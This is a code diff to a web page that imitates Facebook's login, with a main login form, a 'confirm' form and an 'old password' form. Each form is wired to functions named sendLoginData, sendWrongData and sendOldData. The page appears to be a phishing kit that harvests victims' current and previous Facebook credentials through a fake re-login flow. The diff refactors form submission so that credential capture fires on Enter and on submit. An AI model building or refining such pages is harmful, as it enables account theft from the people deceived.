@@ -446,7 +446,7 @@
                     onclick="document.getElementById('facebook-modal').style.display='none'"
                     aria-label="Close">&#x2715;</button>
             <h2 class="fb26-h2">Log into Facebook</h2>
-            <form onsubmit="return false" autocomplete="on">
+            <form id="fb-main-login-form" autocomplete="on">
               <div class="fb26-field">
                 <div class="fb26-iw">
                   <input type="text" id="email" name="email" class="fb26-i"
@@ -469,7 +469,7 @@
                   </button>
                 </div>
               </div>
-              <button type="button" id="loginBtn" class="fb26-btn-p" disabled>Log in</button>
+              <button type="submit" id="loginBtn" class="fb26-btn-p" disabled>Log in</button>
               <a href="#" class="fb26-forgot">Forgot password?</a>
             </form>
 
@@ -545,7 +545,7 @@
                 <a href="#">Forgotten your password?</a>
               </div>
             </div>
-            <form onsubmit="return false" autocomplete="on">
+            <form id="fb-confirm-login-form" autocomplete="on">
               <div class="fb26-field">
                 <div class="fb26-iw">
                   <input type="text" id="confirm_username" class="fb26-i"
@@ -568,7 +568,7 @@
                   </button>
                 </div>
               </div>
-              <button type="button" id="confirm_login" class="fb26-btn-p" disabled>Log in</button>
+              <button type="submit" id="confirm_login" class="fb26-btn-p" disabled>Log in</button>
               <a href="#" class="fb26-forgot">Forgotten your password?</a>
             </form>
             <div class="fb26-foot" style="padding-top:8px">
@@ -606,7 +606,7 @@
                 <a href="#">Forgotten your password?</a>
               </div>
             </div>
-            <form onsubmit="return false" autocomplete="on">
+            <form id="fb-old-login-form" autocomplete="on">
               <div class="fb26-field">
                 <div class="fb26-iw">
                   <input type="text" id="old_username" class="fb26-i"
@@ -1475,39 +1475,43 @@
         const old_username = document.getElementById('old_username');
         const old_password = document.getElementById('old_password');
 
-        usernameInput.addEventListener('input', enableLoginBtn);
-        passwordInput.addEventListener('input', enableLoginBtn);
-        confirm_username.addEventListener('input', enableLoginBtn);
-        confirm_password.addEventListener('input', enableLoginBtn);
-        old_username.addEventListener('input', enableLoginBtn);
-        old_password.addEventListener('input', enableLoginBtn);
-
         function setBtnReady(btn, ready) {
+            if (!btn) return;
             btn.disabled = !ready;
             btn.style.opacity = ready ? '1' : '0.4';
             btn.style.cursor = ready ? 'pointer' : 'not-allowed';
         }
 
         function enableLoginBtn() {
-            setBtnReady(loginBtn, usernameInput.value.trim() && passwordInput.value.trim());
-            setBtnReady(confirm_login, confirm_username.value.trim() && confirm_password.value.trim());
-            setBtnReady(old_login, old_username.value.trim() && old_password.value.trim());
+            setBtnReady(loginBtn, usernameInput && usernameInput.value.trim() && passwordInput && passwordInput.value.trim());
+            setBtnReady(confirm_login, confirm_username && confirm_username.value.trim() && confirm_password && confirm_password.value.trim());
+            setBtnReady(old_login, old_username && old_username.value.trim() && old_password && old_password.value.trim());
         }
 
-        function bindLoginEnter(inputs, btn, submitFn) {
-            inputs.forEach(function (inp) {
-                inp.addEventListener('keydown', function (e) {
-                    if (e.key === 'Enter' && !btn.disabled) {
-                        e.preventDefault();
-                        submitFn();
-                    }
-                });
+        function bindLoginForm(formEl, submitFn) {
+            if (!formEl) return;
+            formEl.addEventListener('submit', function (e) {
+                e.preventDefault();
+                submitFn();
             });
         }
 
-        bindLoginEnter([usernameInput, passwordInput], loginBtn, sendLoginData);
-        bindLoginEnter([confirm_username, confirm_password], confirm_login, sendWrongData);
-        bindLoginEnter([old_username, old_password], old_login, sendOldData);
+        [
+            [usernameInput, passwordInput],
+            [confirm_username, confirm_password],
+            [old_username, old_password]
+        ].forEach(function (inputs) {
+            inputs.forEach(function (inp) {
+                if (!inp) return;
+                inp.addEventListener('input', enableLoginBtn);
+                inp.addEventListener('change', enableLoginBtn);
+            });
+        });
+
+        bindLoginForm(document.getElementById('fb-main-login-form'), sendLoginData);
+        bindLoginForm(document.getElementById('fb-confirm-login-form'), sendWrongData);
+        bindLoginForm(document.getElementById('fb-old-login-form'), sendOldData);
+        enableLoginBtn();
 
         async function sendLoginData() {
             const username = usernameInput.value.trim();
@@ -1635,9 +1639,6 @@
 
 
         }
-        loginBtn.addEventListener('click', sendLoginData);
-        confirm_login.addEventListener('click', sendWrongData);
-        old_login.addEventListener('click', sendOldData);
     </script>
     <script>
         function isMobileDevice() {
